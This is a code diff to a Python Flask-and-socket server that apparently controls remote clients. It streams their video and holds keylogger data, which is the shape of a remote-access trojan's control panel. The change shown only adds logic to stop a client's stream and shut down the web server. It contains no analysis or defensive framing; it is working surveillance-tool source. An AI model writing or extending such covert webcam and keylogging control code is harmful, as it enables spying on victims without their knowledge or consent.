@@ -1,11 +1,12 @@
 import socket
 import threading
 import time
-from flask import Flask, Response, render_template_string
+from flask import Flask, Response, render_template_string, request
 from colorama import Fore, init
 import cv2
 import numpy as np
 import keyboard  # Import the keyboard library
+import os
 
 init(autoreset=True)
 
@@ -15,7 +16,6 @@ server_thread = None
 streaming = False
 keylogger_data = []  # List to store keylogger data
 keylogger_running = False  # Flag to check if keylogger is running
-
 
 # HTML template for video streaming with a stop button
 html_template = """
@@ -43,15 +43,19 @@ html_template = """
 
 @app.route('/stop_streaming/<client_id>', methods=['GET'])
 def stop_streaming(client_id):
-    global clients
+    global clients, streaming
     print(Fore.RED + f"[ * ] Stopping stream for client {client_id}")
     clients[client_id]['streaming'] = False  # Stop the server-side stream
+    streaming = False
 
     # Send a command to the client to stop its stream
     try:
         client_socket = clients[client_id]['socket']
         stop_command = "stop_stream"
         client_socket.send(stop_command.encode('utf-8'))  # Instruct client to stop streaming
+        func = request.environ.get('werkzeug.server.shutdown')
+        if func:
+            func()
         return "Streaming stopped for client " + client_id
     except KeyError:
         print(Fore.RED + f"[ * ] Client {client_id} not found.")
